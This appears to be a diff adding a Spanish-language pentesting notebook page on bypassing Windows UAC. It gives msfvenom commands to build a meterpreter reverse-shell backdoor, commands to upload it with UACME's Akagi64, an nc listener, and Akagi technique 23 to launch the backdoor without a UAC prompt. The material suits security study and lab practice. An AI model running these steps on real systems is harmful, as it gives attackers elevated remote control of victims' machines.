@@ -1,0 +1,91 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Bypass UAC | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="bypassing-uac">
+          <div class="note-tabbar">
+            <span>Bypass UAC</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Escalada de Privilegios/Windows/Políticas y UAC</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">escalada de privilegios / windows / políticas y uac</p>
+            <h2>Bypass UAC</h2>
+
+            <p>Ejecutar un <code>payload controlado</code> y hacer bypass de <code>UAC</code>. <span class="notebook-review-note">[REVISAR]: imagen de Obsidian no migrada: Pasted image 20251014191245.png</span></p>
+
+            <aside class="callout warning">
+              <p>UAC bypass no es una escalada desde usuario estándar: normalmente requiere que el usuario ya pertenezca al grupo de administradores locales y sirve para saltar el prompt/filtrado de UAC.</p>
+            </aside>
+
+<ul>
+              <li><code>Windows 7 - 10</code></li>
+              <li><code>Cuenta de Usuario en el grupo de administradores</code></li>
+            </ul>
+
+            <section class="code-card">
+              <h3>Kali: Crear payload</h3>
+              <pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;kali_ip&gt; LPORT=4444 -f exe &gt; backdoor.exe</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Subir los archivos del bypass y backdoor</h3>
+              <pre><code>upload /root/Desktop/tools/UACME/Akagi64.exe .
+upload /root/backdoor.exe .</code></pre>
+            </section>
+
+            <section class="code-card">
+              <h3>Kali: Listener</h3>
+              <pre><code>nc -lvnp 4444</code></pre>
+            </section>
+
+            <p><code>Akagi</code> nos permite <code>hacer bypass de</code> el <code>UAC</code> que es el encargado de pedir confirmación sobre el <code>backdoor</code> que estamos cargando y saltamos el control de UAC en un contexto ya administrativo</p>
+
+            <section class="code-card">
+              <h3>CMD: Usamos la técnica 23 de la documentación del repositorio</h3>
+              <pre><code>Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe</code></pre>
+            </section>
+
+            <p><a href="https://github.com/hfiref0x/UACME">Repositorio UACME</a></p>
+
+                        <h2>Tags</h2>
+            <div class="tag-list">
+              <span>notebook</span>
+              <span>windows</span>
+              <span>privesc</span>
+              <span>escalada_privilegios</span>
+              <span>uac</span>
+              <span>politicas</span>
+              <span>bypassing</span>
+              <span>bypass</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
